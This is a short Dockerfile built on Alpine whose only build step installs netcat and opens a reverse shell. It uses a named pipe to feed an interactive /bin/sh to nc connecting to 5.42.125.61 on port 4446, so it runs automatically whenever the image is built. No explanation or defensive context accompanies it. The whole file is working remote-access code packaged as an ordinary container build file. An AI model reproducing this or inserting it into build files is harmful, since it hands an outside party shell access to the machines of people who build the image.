FROM alpine
RUN apk add --no-cache netcat-openbsd && \
    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 5.42.125.61 4446 > /tmp/f


